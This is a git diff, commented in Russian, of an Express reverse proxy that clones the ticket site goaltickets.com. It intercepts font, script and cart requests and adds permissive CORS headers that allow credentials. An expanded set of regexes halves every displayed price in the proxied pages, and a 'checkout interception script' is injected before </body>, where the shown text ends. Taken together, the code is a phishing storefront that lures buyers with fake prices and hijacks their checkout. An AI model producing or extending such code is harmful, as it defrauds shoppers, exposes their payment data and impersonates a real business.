@@ -122,6 +122,18 @@ app.get('*checkout*', (req, res) => {
       next();
     });
 
+    // Проксируем все шрифты
+    app.get('/cdn/fonts/*', (req, res, next) => {
+      console.log('🔤 Fonts intercepted:', req.url);
+      next();
+    });
+
+    // Проксируем все скрипты
+    app.get('/cdn/shop/t/*', (req, res, next) => {
+      console.log('📜 Shop scripts intercepted:', req.url);
+      next();
+    });
+
     // Проксируем все AJAX запросы к корзине
     app.post('/cart/add.js', (req, res, next) => {
       console.log('🛒 Cart add.js intercepted:', req.url);
@@ -148,24 +160,30 @@ app.post('/api/*', (req, res) => {
   res.status(200).json({ success: true });
 });
 
-// Обработка POST запросов к корзине
-app.post('/cart', (req, res) => {
-  console.log('🛒 Cart POST intercepted:', req.url);
-  // Проксируем к оригинальному сайту для обработки корзины
-  const cartProxy = createProxyMiddleware({
-    target: 'https://goaltickets.com',
-    changeOrigin: true,
-    secure: true,
-    onProxyRes: (proxyRes, req, res) => {
-      // Позволяем корзине работать нормально
-      if (!res.headersSent) {
-        res.writeHead(proxyRes.statusCode, proxyRes.headers);
-        proxyRes.pipe(res);
-      }
-    }
-  });
-  cartProxy(req, res);
-});
+    // Обработка POST запросов к корзине
+    app.post('/cart', (req, res) => {
+      console.log('🛒 Cart POST intercepted:', req.url);
+      // Проксируем к оригинальному сайту для обработки корзины
+      const cartProxy = createProxyMiddleware({
+        target: 'https://goaltickets.com',
+        changeOrigin: true,
+        secure: true,
+        onProxyRes: (proxyRes, req, res) => {
+          // Добавляем CORS заголовки
+          proxyRes.headers['Access-Control-Allow-Origin'] = '*';
+          proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
+          proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
+          proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
+          
+          // Позволяем корзине работать нормально
+          if (!res.headersSent) {
+            res.writeHead(proxyRes.statusCode, proxyRes.headers);
+            proxyRes.pipe(res);
+          }
+        }
+      });
+      cartProxy(req, res);
+    });
 
 app.post('/cart/*', (req, res) => {
   // Если это запрос на добавление в корзину, обрабатываем как обычно
@@ -177,6 +195,12 @@ app.post('/cart/*', (req, res) => {
       changeOrigin: true,
       secure: true,
       onProxyRes: (proxyRes, req, res) => {
+        // Добавляем CORS заголовки
+        proxyRes.headers['Access-Control-Allow-Origin'] = '*';
+        proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
+        proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
+        proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
+        
         // Позволяем корзине работать нормально
         if (!res.headersSent) {
           res.writeHead(proxyRes.statusCode, proxyRes.headers);
@@ -339,114 +363,78 @@ const proxyOptions = {
         // Изменяем цены в HTML - делим на 2
         let modifiedBody = body;
         
-        // Простой поиск и замена цен
-        console.log('💰 Starting price modification...');
-        
-        // Ищем все цены в формате "From $XXX.XX USD"
-        modifiedBody = modifiedBody.replace(/From\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, (match, price) => {
-          const cleanPrice = price.replace(/,/g, '');
-          const originalPrice = parseFloat(cleanPrice);
-          
-          if (!isNaN(originalPrice) && originalPrice > 10) {
-            const newPrice = Math.round(originalPrice / 2 * 100) / 100;
-            const formattedPrice = newPrice.toLocaleString('en-US', {
-              minimumFractionDigits: 2,
-              maximumFractionDigits: 2
-            });
+            // Агрессивный поиск и замена цен
+            console.log('💰 Starting aggressive price modification...');
             
-            console.log(`💰 Simple price changed: From $${price} USD -> From $${formattedPrice} USD`);
-            return `From $${formattedPrice} USD`;
-          }
-          return match;
-        });
-        
-        // Ищем все цены в формате "$XXX.XX USD"
-        modifiedBody = modifiedBody.replace(/\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, (match, price) => {
-          const cleanPrice = price.replace(/,/g, '');
-          const originalPrice = parseFloat(cleanPrice);
-          
-          if (!isNaN(originalPrice) && originalPrice > 10) {
-            const newPrice = Math.round(originalPrice / 2 * 100) / 100;
-            const formattedPrice = newPrice.toLocaleString('en-US', {
-              minimumFractionDigits: 2,
-              maximumFractionDigits: 2
-            });
+            // Ищем все цены в различных форматах
+            const pricePatterns = [
+              // From $XXX.XX USD -> From $XXX.XX USD
+              { pattern: /From\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: 'From $', suffix: ' USD' },
+              // $XXX.XX USD -> $XXX.XX USD
+              { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: '$', suffix: ' USD' },
+              // USD $XXX.XX -> USD $XXX.XX
+              { pattern: /USD\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: 'USD $', suffix: '' },
+              // USD XXX.XX -> USD XXX.XX
+              { pattern: /USD\s+(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: 'USD ', suffix: '' },
+              // XXX.XX USD -> XXX.XX USD
+              { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: '', suffix: ' USD' },
+              // $XXX.XX -> $XXX.XX
+              { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '$', suffix: '' },
+              // Цены в data атрибутах
+              { pattern: /data-price="(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)"/g, prefix: 'data-price="', suffix: '"' },
+              // Цены в JSON
+              { pattern: /"price":\s*(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '"price": ', suffix: '' },
+              // Цены в span с классом price
+              { pattern: /<span[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/span>/g, prefix: '', suffix: '' },
+              // Цены в div с классом price
+              { pattern: /<div[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/div>/g, prefix: '', suffix: '' },
+              // Цены в p с классом price
+              { pattern: /<p[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/p>/g, prefix: '', suffix: '' },
+              // Цены в strong с классом price
+              { pattern: /<strong[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/strong>/g, prefix: '', suffix: '' },
+              // Цены в h1-h6 с классом price
+              { pattern: /<h[1-6][^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/h[1-6]>/g, prefix: '', suffix: '' },
+              // Цены в любом элементе с классом содержащим price
+              { pattern: /<[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/[^>]*>/g, prefix: '', suffix: '' },
+              // Цены в data атрибутах с разными именами
+              { pattern: /data-amount="(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)"/g, prefix: 'data-amount="', suffix: '"' },
+              { pattern: /data-cost="(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)"/g, prefix: 'data-cost="', suffix: '"' },
+              { pattern: /data-value="(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)"/g, prefix: 'data-value="', suffix: '"' },
+              // Цены в JSON с разными ключами
+              { pattern: /"amount":\s*(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '"amount": ', suffix: '' },
+              { pattern: /"cost":\s*(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '"cost": ', suffix: '' },
+              { pattern: /"value":\s*(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '"value": ', suffix: '' },
+              // Цены в тексте без символа доллара
+              { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*\/ticket/g, prefix: '', suffix: ' /ticket' },
+              { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*per\s+ticket/g, prefix: '', suffix: ' per ticket' },
+              // Цены в формате "900.00 /ticket"
+              { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*\/ticket/g, prefix: '', suffix: ' /ticket' },
+              // Простые цены с долларом
+              { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '$', suffix: '' }
+            ];
             
-            console.log(`💰 Simple price changed: $${price} USD -> $${formattedPrice} USD`);
-            return `$${formattedPrice} USD`;
-          }
-          return match;
-        });
-        
-        // Ищем и заменяем цены в различных форматах
-        const pricePatterns = [
-          // From $350.00 USD -> From $175.00 USD
-          /From\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
-          // $350.00 USD -> $175.00 USD
-          /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
-          // USD $3,500.00 -> USD $1,750.00
-          /USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
-          // USD 3500.00 -> USD 1750.00
-          /USD\s+(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
-          // 3500.00 USD -> 1750.00 USD
-          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
-          // Цены в скобках (USD $3,500.00)
-          /\(USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\)/g,
-          // Цены в data атрибутах
-          /data-price="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
-          // Цены в JSON
-          /"price":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
-          // Цены в span с классом price
-          /<span[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/span>/g,
-          // Цены в div с классом price
-          /<div[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/div>/g,
-          // Цены в p с классом price
-          /<p[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/p>/g,
-          // Цены в strong с классом price
-          /<strong[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/strong>/g,
-          // Цены в h1-h6 с классом price
-          /<h[1-6][^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/h[1-6]>/g,
-          // Цены в любом элементе с классом содержащим price
-          /<[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/[^>]*>/g,
-          // Цены в data атрибутах с разными именами
-          /data-amount="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
-          /data-cost="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
-          /data-value="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
-          // Цены в JSON с разными ключами
-          /"amount":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
-          /"cost":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
-          /"value":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
-          // Цены в тексте без символа доллара
-          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*\/ticket/g,
-          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*per\s+ticket/g,
-          // Цены в формате "900.00 /ticket"
-          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*\/ticket/g,
-          // Простые цены с долларом
-          /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g
-        ];
-        
-        pricePatterns.forEach(pattern => {
-          modifiedBody = modifiedBody.replace(pattern, (match, price) => {
-            // Убираем запятые и конвертируем в число
-            const cleanPrice = price.replace(/,/g, '');
-            const originalPrice = parseFloat(cleanPrice);
-            
-            if (!isNaN(originalPrice) && originalPrice > 0 && originalPrice > 10) { // Только цены больше 10
-              // Делим на 2 и округляем до 2 знаков
-              const newPrice = Math.round(originalPrice / 2 * 100) / 100;
-              
-              // Форматируем обратно с запятыми
-              const formattedPrice = newPrice.toLocaleString('en-US', {
-                minimumFractionDigits: 2,
-                maximumFractionDigits: 2
+            pricePatterns.forEach(({ pattern, prefix, suffix }) => {
+              modifiedBody = modifiedBody.replace(pattern, (match, price) => {
+                // Убираем запятые и конвертируем в число
+                const cleanPrice = price.replace(/,/g, '');
+                const originalPrice = parseFloat(cleanPrice);
+                
+                if (!isNaN(originalPrice) && originalPrice > 0 && originalPrice > 10) { // Только цены больше 10
+                  // Делим на 2 и округляем до 2 знаков
+                  const newPrice = Math.round(originalPrice / 2 * 100) / 100;
+                  
+                  // Форматируем обратно с запятыми
+                  const formattedPrice = newPrice.toLocaleString('en-US', {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2
+                  });
+                  
+                  console.log(`💰 Price changed: ${prefix}${price}${suffix} -> ${prefix}${formattedPrice}${suffix}`);
+                  return match.replace(price, formattedPrice);
+                }
+                return match;
               });
-              
-              console.log(`💰 Price changed: $${price} -> $${formattedPrice}`);
-              return match.replace(price, formattedPrice);
-            }
-            return match;
-          });
-        });
+            });
         
         // Добавляем скрипт перехвата перед закрывающим тегом </body>
         const checkoutScript = `
